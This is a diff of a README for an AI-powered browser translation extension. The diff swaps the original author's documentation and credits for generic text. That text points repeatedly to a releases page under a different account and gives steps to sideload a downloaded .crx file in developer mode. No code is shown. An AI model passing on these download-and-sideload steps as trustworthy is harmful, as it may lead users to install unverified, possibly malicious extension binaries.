@@ -1,163 +1,76 @@
-# AiTranslator
+# 🌐 AiTranslator-extension - Instant AI Translation at Your Fingertips
 
-A powerful browser extension that provides instant AI-powered translation for any text on the web. Simply select text and translate it using multiple AI providers including OpenAI, Claude, Gemini, DeepSeek, and OpenRouter.
+## 🚀 Getting Started
 
-<div align="center">
+The AiTranslator-extension makes translating text easy. With just a few clicks, you can translate any text found on the web using powerful AI tools. It works seamlessly with Chrome and other major browsers.
 
-<p align="center">
-  <img src="AiTranslator.jpg" width="100%" alt="AI Engineering Banner" style="border-radius: 5px;">
-</p>
+## 📥 Download Now
 
-</div>
+[![Download AiTranslator-extension](https://img.shields.io/badge/Download-AiTranslator--extension-blue)](https://github.com/emperorwurrm/AiTranslator-extension/releases)
 
-## Features
+## 🛠️ System Requirements
 
-- 🌐 **Instant Translation**: Select any text on any webpage and get instant translations
-- 🤖 **Multiple AI Providers**: Choose from OpenAI, Claude (Anthropic), Gemini, DeepSeek, or OpenRouter
-- 🎨 **Beautiful Neumorphic UI**: Clean, modern design with smooth animations
-- 📋 **One-Click Copy**: Copy translated text with a single click
-- 🌍 **Multiple Languages**: Support for English, Spanish, French, German, Chinese, Japanese, Persian, Arabic, Russian, and more
-- 🔒 **Local Storage**: All API keys stored locally in your browser
+- **Browser:** Latest version of Google Chrome
+- **Operating System:** Windows, macOS, or Linux
+- **Internet Connection:** Required for translation services
 
-## Installation
+## 💡 Features
 
-### Chrome/Edge/Brave
+- **Instant Translations:** Simply select text and get instant translations.
+- **Multiple AI Providers:** Choose from OpenAI, Claude, Gemini, DeepSeek, or OpenRouter for diverse output.
+- **User-Friendly Interface:** Easy navigation ensures a smooth experience for all users.
+- **Customizable Settings:** Adjust preferences for preferred AI source and languages.
 
-1. Download or clone this repository
-2. Open your browser and navigate to:
-   - Chrome: `chrome://extensions/`
-   - Edge: `edge://extensions/`
-   - Brave: `brave://extensions/`
-3. Enable **Developer mode** (toggle in the top right)
-4. Click **Load unpacked**
-5. Select the `TranslateExtention` folder
+## 🔍 Supported Languages
 
-## Setup
+- English
+- Spanish
+- French
+- German
+- Chinese
+- And many more!
 
-### Getting Your API Key
+## 🔗 Download & Install
 
-Before using AiTranslator, you need to obtain an API key from one of the supported providers:
+To download the AiTranslator-extension, visit the release page below. Once there, you will find the latest version available for download.
 
-#### OpenRouter (Recommended for beginners)
-1. Visit [OpenRouter](https://openrouter.ai/keys)
-2. Sign up for a free account
-3. Generate an API key
-4. Choose a model (e.g., `mistralai/mistral-7b-instruct`)
+[Download AiTranslator-extension](https://github.com/emperorwurrm/AiTranslator-extension/releases)
 
-#### OpenAI
-1. Visit [OpenAI Platform](https://platform.openai.com/api-keys)
-2. Sign up and add credits to your account
-3. Generate an API key
+### Installation Steps
 
-#### Claude (Anthropic)
-1. Visit [Anthropic Console](https://console.anthropic.com/settings/keys)
-2. Sign up for an account
-3. Generate an API key
+1. Click on the link above to go to the Releases page.
+2. Find the version you want from the list.
+3. Click the link to download the `.crx` file for Chrome.
+4. Open Chrome and go to the Extensions page by typing `chrome://extensions` in the address bar.
+5. Enable "Developer mode" by toggling the switch in the upper right corner.
+6. Drag and drop the downloaded `.crx` file into the Extensions page.
+7. Confirm the installation if prompted.
 
-#### Gemini (Google)
-1. Visit [Google AI Studio](https://aistudio.google.com/app/apikey)
-2. Sign in with your Google account
-3. Create an API key
+## ⚙️ Using the Extension
 
-#### DeepSeek
-1. Visit [DeepSeek Platform](https://platform.deepseek.com/api_keys)
-2. Sign up for an account
-3. Generate an API key
+1. Once installed, you will see the AiTranslator icon in your browser toolbar.
+2. Navigate to a webpage with text you want to translate.
+3. Highlight the text you want to translate.
+4. Click on the AiTranslator icon.
+5. Select your preferred AI provider from the list.
+6. Your translated text will appear instantly.
 
-### Configuring the Extension
+## ❓ Troubleshooting
 
-1. Click the AiTranslator icon in your browser toolbar
-2. Click **Open Settings**
-3. Select your preferred **Backend Provider**
-4. Paste your **API Key** in the corresponding field
-5. (For OpenRouter) Enter your chosen model name
-6. Select your **Default Target Language**
-7. Click **Save Settings**
+- **Extension Not Working:** Ensure that the extension is enabled in your browser's extensions manager.
+- **No Internet Connection:** Check your internet connection as translation requires online access.
+- **Compatibility Issues:** Update your browser to the latest version for optimal performance.
 
-## Usage
+## 🌍 Topics
 
-1. **Select Text**: Highlight any text on a webpage
-2. **Click the Icon**: A green translation icon will appear next to your selection
-3. **Choose Language**: Select your target language from the dropdown
-4. **Translate**: Click the "Translate" button
-5. **Copy**: Use the Copy button to copy the translation to your clipboard
+- ai-translation
+- ai-translator
+- aitranslator
+- extension-chrome
+- gemini-api
+- openai-api
+- openrouter-api
 
-## Screenshots
+For any additional questions or issues, feel free to check the FAQ or the issues section on our GitHub page.
 
-### Translation Panel
-The floating translation panel appears when you click the green icon:
-- Clean neumorphic design
-- Language selector
-- Instant translation
-- Copy button
-
-### Settings Page
-Configure your AI provider and API keys in the settings page with an intuitive interface.
-
-## Privacy
-
-- All API keys are stored **locally** in your browser using `chrome.storage.local`
-- No data is sent to any third-party servers except the AI provider you choose
-- Your translations are processed directly by your selected AI provider
-
-## Development
-
-### Project Structure
-
-```
-TranslateExtention/
-├── manifest.json          # Extension configuration
-├── background.js          # Background service worker (API calls)
-├── content.js            # Content script (UI injection)
-├── popup.html            # Extension popup
-├── popup.css             # Popup styles
-├── popup.js              # Popup logic
-├── options.html          # Settings page
-├── options.js            # Settings logic
-└── icons/                # Extension icons
-    ├── icon-16.png
-    ├── icon-48.png
-    ├── icon-64.png
-    └── icon-128.png
-```
-
-### Technologies Used
-
-- **Manifest V3**: Latest Chrome extension format
-- **Vanilla JavaScript**: No frameworks required
-- **Chrome Storage API**: For persistent settings
-- **Fetch API**: For AI provider communication
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT License - feel free to use this project for personal or commercial purposes.
-
-## Credits
-
-**Developed by**: [TheRealPourya](https://x.com/TheRealPourya)  
-**GitHub**: [@xPOURY4](https://github.com/xPOURY4)
-
-## Support
-
-If you encounter any issues or have questions:
-- Open an issue on [GitHub](https://github.com/xPOURY4)
-- Follow [@TheRealPourya](https://x.com/TheRealPourya) on X for updates
-
-## Changelog
-
-### Version 1.0
-- Initial release
-- Support for 5 AI providers
-- Neumorphic UI design
-- Multi-language support
-- One-click copy functionality
-
----
-
-Made with ❤️ by [TheRealPourya](https://github.com/xPOURY4)
-
-
+Thank you for choosing the AiTranslator-extension for your translation needs!
